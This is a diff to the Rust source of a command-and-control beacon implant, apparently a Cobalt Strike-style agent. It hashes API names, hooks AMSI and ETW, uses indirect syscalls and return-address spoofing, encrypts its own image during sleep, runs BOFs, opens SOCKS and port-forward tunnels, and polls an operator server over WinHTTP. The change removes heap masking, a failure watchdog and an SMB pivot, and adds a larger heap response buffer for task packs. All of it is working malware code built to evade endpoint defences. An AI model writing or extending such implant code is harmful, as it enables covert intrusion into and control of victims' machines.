@@ -15,7 +15,6 @@ use specter_core::beat::BeatData;
 use specter_core::config;
 use specter_core::fnv::{fnv1a64, fnv1a64_wide_ascii_ci};
 use specter_core::heap::{self, GetProcessHeapFn, HeapAllocFn, HeapFreeFn};
-use specter_core::heapmask;
 use specter_core::hwbp::Hooks;
 use specter_core::peb::{self, Peb};
 use specter_core::rc4::Rc4;
@@ -25,7 +24,6 @@ use specter_core::sleepmask::SleepMaskParams;
 use specter_core::syscalls::{ms_to_delay_interval, pick_gadget};
 use specter_core::time::{filetime_to_unix_epoch, is_expired};
 use specter_core::transport::{self, Task};
-use specter_core::watchdog::{Watchdog, DEFAULT_MAX_FAILS};
 use specter_core::wire::Writer;
 
 use crate::runtime::hwbp as beacon_hwbp;
@@ -53,10 +51,6 @@ pub struct Instance {
     pub retspoof_imm: u8,
     /// Encrypted sleep mask parameters; None = plain indirect sleep.
     pub sleep_mask: Option<SleepMaskParams>,
-    /// Mode-0 encrypted-range bounds (page-clamped around the in-image
-    /// stub); mode 1 overwrites stub_start/stub_end with img_end per cycle.
-    pub mask_stub_start: usize,
-    pub mask_stub_end: usize,
     pub get_system_time_as_file_time: unsafe extern "system" fn(*mut u64),
     pub exit_thread: unsafe extern "system" fn(u32),
     pub rng: XorShift64,
@@ -96,12 +90,6 @@ pub struct Instance {
     /// ws2_32 module (tunnels): null until the first tunnel task loads
     /// it and runs WSAStartup (tunnel_surface).
     pub ws2: *mut c_void,
-    /// Active SMB named-pipe pivot (`link`): the check-in transport runs
-    /// over this pipe instead of WinHTTP until `unlink`.
-    pub pivot: Option<crate::net::PivotState>,
-    /// Check-in watchdog: too many consecutive transport failures and the
-    /// beacon exits silently.
-    pub watchdog: Watchdog,
     /// Tunnel channels (socks/lportfwd/rportfwd): connected sockets and
     /// the rportfwd listener, drained every cycle.
     pub tunnels: [crate::tasks::Tunnel; crate::tasks::MAX_TUNNELS],
@@ -115,12 +103,13 @@ pub struct Instance {
     pub upload: Option<crate::tasks::UploadState>,
     /// BOF runtime outputs waiting for the next POSTs (one BOF at a time).
     pub bof_pending: Option<crate::coff::BofPending>,
-    /// Async BOF run (one at a time): worker thread + heap context.
-    pub bof_job: Option<crate::coff::BofJob>,
-    /// Spinlock guarding the BOF output queue (BOF thread vs beacon thread).
-    pub bof_lock: core::sync::atomic::AtomicBool,
     /// Threadpool sleep + TIB spoof state (port of sleep.c 160-560).
     pub ekko: crate::runtime::ekko::EkkoState,
+    /// Heap response page buffer (256 KiB) — the HTTP task pack can exceed
+    /// any reasonable stack frame (big BOF images, chunked uploads), so the
+    /// page is read into a heap region, not a stack array.
+    pub resp_buf: *mut u8,
+    pub resp_cap: usize,
     /// Debug channel handle (0 = closed/absent; `config::DEBUG` builds).
     pub debug_handle: isize,
 }
@@ -135,6 +124,12 @@ const H_RTL_EXIT_USER_THREAD: u64 = fnv1a64(b"RtlExitUserThread");
 
 /// kernel32 export hashes.
 const H_GET_PROCESS_HEAP: u64 = fnv1a64(b"GetProcessHeap");
+const H_VIRTUAL_ALLOC: u64 = fnv1a64(b"VirtualAlloc");
+const MEM_RESERVE: u32 = 0x2000;
+const MEM_COMMIT: u32 = 0x1000;
+const PAGE_READWRITE: u32 = 0x04;
+/// Heap response-page capacity (the plugin caps packs at 192 KiB).
+const RESP_CAP: usize = 0x40000;
 const H_HEAP_ALLOC: u64 = fnv1a64(b"HeapAlloc");
 const H_HEAP_FREE: u64 = fnv1a64(b"HeapFree");
 const H_GET_SYSTEM_TIME_AS_FILE_TIME: u64 = fnv1a64(b"GetSystemTimeAsFileTime");
@@ -330,9 +325,6 @@ unsafe fn bootstrap() -> Option<Instance> {
     // through loader notifications (Dr3 — the ETW hooks left it free).
     if config::HOOKS {
         crate::runtime::amsi::install(peb, ntdll, &syscall_table, &mut etw_hooks);
-        // dll-notify: disable foreign loader-notification callbacks (ours
-        // stays); best effort, never fatal.
-        let _unhooked = crate::runtime::amsi::unhook_foreign_notifications(ntdll);
     }
     crate::runtime::debug::log_handle(dbg, b"bs: amsi ok\n");
     stage_gate(8);
@@ -393,6 +385,32 @@ unsafe fn bootstrap() -> Option<Instance> {
     };
     crate::runtime::debug::log_handle(dbg, b"bs: ekko ok\n");
 
+    // Response page buffer (heap): 256 KiB covers the malleable page
+    // template around a 192 KiB task pack (the plugin caps packs there).
+    let resp_buf = {
+        let va = peb::find_export(kernel32, H_VIRTUAL_ALLOC);
+        if va.is_null() {
+            core::ptr::null_mut()
+        } else {
+            let va = core::mem::transmute::<
+                *const core::ffi::c_void,
+                unsafe extern "system" fn(
+                    *mut core::ffi::c_void,
+                    usize,
+                    u32,
+                    u32,
+                ) -> *mut core::ffi::c_void,
+            >(va as *const core::ffi::c_void);
+            va(
+                core::ptr::null_mut(),
+                RESP_CAP,
+                MEM_RESERVE | MEM_COMMIT,
+                PAGE_READWRITE,
+            ) as *mut u8
+        }
+    };
+    crate::runtime::debug::log_handle(dbg, b"bs: respbuf ok\n");
+
     let wh = winhttp::resolve(peb, kernel32);
     crate::runtime::debug::log_handle(dbg, b"bs: winhttp ok\n");
     let sysinfo = crate::runtime::sysinfo::collect(peb, dbg);
@@ -414,11 +432,6 @@ unsafe fn bootstrap() -> Option<Instance> {
         .checked_div(config::SLEEP_MS)
         .unwrap_or(0);
 
-    let (mask_stub_start, mask_stub_end) = match &sleep_mask {
-        Some(m) => (m.stub_start, m.stub_end),
-        None => (0, 0),
-    };
-
     let instance = Instance {
         watermark: config::WATERMARK,
         ntdll,
@@ -429,8 +442,6 @@ unsafe fn bootstrap() -> Option<Instance> {
         retspoof_gadget,
         retspoof_imm,
         sleep_mask,
-        mask_stub_start,
-        mask_stub_end,
         get_system_time_as_file_time: core::mem::transmute::<
             *const core::ffi::c_void,
             unsafe extern "system" fn(*mut u64),
@@ -459,15 +470,13 @@ unsafe fn bootstrap() -> Option<Instance> {
         next_token_id: 0,
         active_token: 0,
         ws2: core::ptr::null_mut(),
-        pivot: None,
-        watchdog: Watchdog::new(DEFAULT_MAX_FAILS),
         tunnels: [crate::tasks::Tunnel::EMPTY; crate::tasks::MAX_TUNNELS],
         tunnels_len: 0,
         upload: None,
         bof_pending: None,
-        bof_job: None,
-        bof_lock: core::sync::atomic::AtomicBool::new(false),
         ekko,
+        resp_buf,
+        resp_cap: if resp_buf.is_null() { 0 } else { RESP_CAP },
         // The handle opened at the very top of the bootstrap carries over.
         debug_handle: dbg,
     };
@@ -607,9 +616,6 @@ unsafe fn check_in_cycle(instance: &mut Instance) {
         Some(len) => len,
         None => {
             crate::runtime::debug::log(instance, b"ci: fail beat\n");
-            if instance.watchdog.note_fail() {
-                syscalls::exit_thread(instance.exit_thread);
-            }
             return;
         }
     };
@@ -623,9 +629,6 @@ unsafe fn check_in_cycle(instance: &mut Instance) {
         || !push_bytes(&mut headers, &mut hl, b"\r\n")
     {
         crate::runtime::debug::log(instance, b"ci: fail beat header\n");
-        if instance.watchdog.note_fail() {
-            syscalls::exit_thread(instance.exit_thread);
-        }
         return;
     }
     let mut hi = 0;
@@ -634,9 +637,6 @@ unsafe fn check_in_cycle(instance: &mut Instance) {
             || !push_bytes(&mut headers, &mut hl, b"\r\n")
         {
             crate::runtime::debug::log(instance, b"ci: fail headers\n");
-            if instance.watchdog.note_fail() {
-                syscalls::exit_thread(instance.exit_thread);
-            }
             return;
         }
         hi += 1;
@@ -653,9 +653,6 @@ unsafe fn check_in_cycle(instance: &mut Instance) {
         || (instance.results_len > 0 && !w.push(&instance.results[..instance.results_len]))
     {
         crate::runtime::debug::log(instance, b"ci: fail results\n");
-        if instance.watchdog.note_fail() {
-            syscalls::exit_thread(instance.exit_thread);
-        }
         return;
     }
     let mut chunk: [u8; 48 * 1024] = core::mem::MaybeUninit::uninit().assume_init();
@@ -666,9 +663,6 @@ unsafe fn check_in_cycle(instance: &mut Instance) {
     crate::tasks::tunnel_tick(instance, &mut w);
     if !transport::finish_results(&mut w) {
         crate::runtime::debug::log(instance, b"ci: fail results\n");
-        if instance.watchdog.note_fail() {
-            syscalls::exit_thread(instance.exit_thread);
-        }
         return;
     }
     let mut body: [u8; 0x12005] = core::mem::MaybeUninit::uninit().assume_init();
@@ -676,9 +670,6 @@ unsafe fn check_in_cycle(instance: &mut Instance) {
         Some(n) => n,
         None => {
             crate::runtime::debug::log(instance, b"ci: fail frame\n");
-            if instance.watchdog.note_fail() {
-                syscalls::exit_thread(instance.exit_thread);
-            }
             return;
         }
     };
@@ -699,21 +690,19 @@ unsafe fn check_in_cycle(instance: &mut Instance) {
         body: &body[..body_len],
     };
 
-    let mut resp: [u8; 0x10000] = core::mem::MaybeUninit::uninit().assume_init();
-    // Transport: an active pivot (`link`) carries the same RC4 body over
-    // the named pipe (u32 LE len || payload each way); otherwise WinHTTP.
-    let k32 = instance.kernel32;
-    let resp_len = match &instance.pivot {
-        Some(p) => crate::net::pipe_exchange(k32, p.handle, &body[..body_len], &mut resp),
-        None => winhttp::post(&wh, &request, &mut resp),
+    // The page is read into the heap buffer (resp_buf): a task pack can be
+    // larger than any stack frame (BOF images, chunked uploads). A null
+    // buffer (alloc failed at bootstrap) falls back to a small stack page.
+    let mut resp_stack: [u8; 0x10000] = core::mem::MaybeUninit::uninit().assume_init();
+    let resp: &mut [u8] = if instance.resp_buf.is_null() || instance.resp_cap == 0 {
+        &mut resp_stack
+    } else {
+        core::slice::from_raw_parts_mut(instance.resp_buf, instance.resp_cap)
     };
-    let resp_len = match resp_len {
+    let resp_len = match winhttp::post(&wh, &request, resp) {
         Some(len) => len,
         None => {
             crate::runtime::debug::log(instance, b"ci: fail post\n");
-            if instance.watchdog.note_fail() {
-                syscalls::exit_thread(instance.exit_thread);
-            }
             return;
         }
     };
@@ -735,9 +724,6 @@ unsafe fn check_in_cycle(instance: &mut Instance) {
         Some(range) => range,
         None => {
             crate::runtime::debug::log(instance, b"ci: fail range\n");
-            if instance.watchdog.note_fail() {
-                syscalls::exit_thread(instance.exit_thread);
-            }
             return;
         }
     };
@@ -747,12 +733,7 @@ unsafe fn check_in_cycle(instance: &mut Instance) {
         // Empty payload = zero hosted tasks: the server writes nothing at
         // all between the prepend and append (no size header), which is a
         // successful check-in with an empty task pack.
-        instance.watchdog.note_ok();
-        crate::runtime::debug::log(
-            instance,
-            b"check-in: ok
-",
-        );
+        crate::runtime::debug::log(instance, b"check-in: ok\n");
         return;
     }
 
@@ -765,9 +746,6 @@ unsafe fn check_in_cycle(instance: &mut Instance) {
         Some(pack) => pack,
         None => {
             crate::runtime::debug::log(instance, b"ci: fail pack\n");
-            if instance.watchdog.note_fail() {
-                syscalls::exit_thread(instance.exit_thread);
-            }
             return;
         }
     };
@@ -842,12 +820,7 @@ unsafe fn check_in_cycle(instance: &mut Instance) {
         i += 1;
     }
     instance.results_len = i;
-    instance.watchdog.note_ok();
-    crate::runtime::debug::log(
-        instance,
-        b"check-in: ok
-",
-    );
+    crate::runtime::debug::log(instance, b"check-in: ok\n");
 }
 
 /// Beacon main, called by the entry stub. Never returns.
@@ -943,10 +916,6 @@ pub unsafe fn main() -> ! {
 /// (ps run, shell) or non-closing tunnel runs beacon code on a foreign
 /// thread — the image cannot be encrypted while one is in flight.
 fn async_active(instance: &Instance) -> bool {
-    // An async BOF runs beacon code (and its mapFuncs) on a foreign thread.
-    if instance.bof_job.is_some() {
-        return true;
-    }
     let mut i = 0usize;
     while i < instance.jobs_len {
         if !instance.jobs[i].killed {
@@ -964,68 +933,6 @@ fn async_active(instance: &Instance) -> bool {
     false
 }
 
-/// The beacon's own live heap ranges (upload/screenshot/BOF queue/donor
-/// context) — the "private heap" the Astral Projection half of sleep.c
-/// masks during the encrypted window. Never the whole process heap:
-/// foreign threads of the host may allocate there while the beacon sleeps.
-fn collect_heap_ranges(instance: &Instance, out: &mut [heapmask::HeapRange]) -> usize {
-    fn push(n: &mut usize, out: &mut [heapmask::HeapRange], ptr: usize, len: usize) {
-        if *n < out.len() && ptr != 0 && len > 0 {
-            out[*n] = heapmask::HeapRange { ptr, len };
-            *n += 1;
-        }
-    }
-    let mut n = 0usize;
-    if let Some(up) = &instance.upload {
-        push(&mut n, out, up.buf as usize, up.cap);
-    }
-    if let Some(sh) = &instance.screenshot {
-        push(&mut n, out, sh.buf as usize, sh.len);
-    }
-    if let Some(p) = &instance.bof_pending {
-        push(&mut n, out, p.buf as usize, p.cap);
-    }
-    if instance.ekko.donor_ctx != 0 {
-        push(
-            &mut n,
-            out,
-            instance.ekko.donor_ctx,
-            core::mem::size_of::<crate::runtime::ekko::DonorCtx>(),
-        );
-    }
-    n
-}
-
-/// Encrypted sleep with the private heap masked around the window: the
-/// heap ranges are XOR-masked before the image mask runs and restored
-/// right after (self-inverse keystream, own seed), so during the sleep
-/// both the image and the beacon's heap buffers are encrypted.
-///
-/// # Safety
-///
-/// The mask pointer must reference the instance-resident block for the
-/// whole call; the collected heap ranges must stay mapped and untouched
-/// by other threads for the whole window.
-unsafe fn ekko_sleep(
-    instance: &mut Instance,
-    mask: usize,
-    seed: u64,
-    interval: i64,
-    gadget: *const core::ffi::c_void,
-) -> bool {
-    let mut ranges = [heapmask::HeapRange { ptr: 0, len: 0 }; heapmask::MAX_HEAP_RANGES];
-    let n = collect_heap_ranges(instance, &mut ranges);
-    let heap_seed = seed ^ 0x5AFE_5EED_0FF1_CAFE;
-    if n > 0 {
-        heapmask::mask_ranges(&ranges[..n], heap_seed);
-    }
-    let r = ekko_sleep_inner(instance, mask, seed, interval, gadget);
-    if n > 0 {
-        heapmask::mask_ranges(&ranges[..n], heap_seed);
-    }
-    r
-}
-
 /// Encrypted sleep through the threadpool worker (SptEkkoSleep): the
 /// beacon thread parks in WaitForSingleObject while the worker spoofs
 /// its parked stack and runs the stub. Returns false when the threadpool
@@ -1035,7 +942,7 @@ unsafe fn ekko_sleep(
 ///
 /// The mask pointer must reference the instance-resident block for the
 /// whole call.
-unsafe fn ekko_sleep_inner(
+unsafe fn ekko_sleep(
     instance: &mut Instance,
     mask: usize,
     seed: u64,
@@ -1050,10 +957,6 @@ unsafe fn ekko_sleep_inner(
     (*m).gadget = gadget as usize;
     (*m).interval = interval;
     if !instance.ekko.pool_ok {
-        // In-image stub: mode 0 with the page-clamped range bounds.
-        (*m).mode = 0;
-        (*m).stub_start = instance.mask_stub_start;
-        (*m).stub_end = instance.mask_stub_end;
         crate::runtime::sleepmask::spt_sleepmask(mask);
         return false;
     }
@@ -1111,25 +1014,8 @@ unsafe fn ekko_sleep_inner(
         set_ctx_ssn: e.set_ctx_ssn,
         resume_ssn: e.resume_ssn,
         gadget,
-        stub_ext: e.stub_ext,
-        backup: 0,
-        unmap_ssn: e.unmap_ssn,
-        alloc_ssn: e.alloc_ssn,
         dbg: instance.debug_handle,
     };
-
-    // Mode 1 (Astral Projection): the backup buffer lives on the heap and
-    // receives the encrypted image before the unmap; the stub copy runs
-    // off-image. Allocated here, freed after the worker signals done.
-    let backup = if e.stub_ext != 0 {
-        match instance.heap {
-            Some(h) => h.allocate((*m).img_end - (*m).img_base),
-            None => core::ptr::null_mut(),
-        }
-    } else {
-        core::ptr::null_mut()
-    };
-    ctx.backup = backup as usize;
 
     let mut tp_work: usize = 0;
     let tp_st = tp_alloc(
@@ -1152,11 +1038,6 @@ unsafe fn ekko_sleep_inner(
     close(h_done);
     if h_beacon_thread != 0 {
         close(h_beacon_thread);
-    }
-    if !backup.is_null() {
-        if let Some(h) = instance.heap {
-            h.deallocate(backup);
-        }
     }
     true
 }
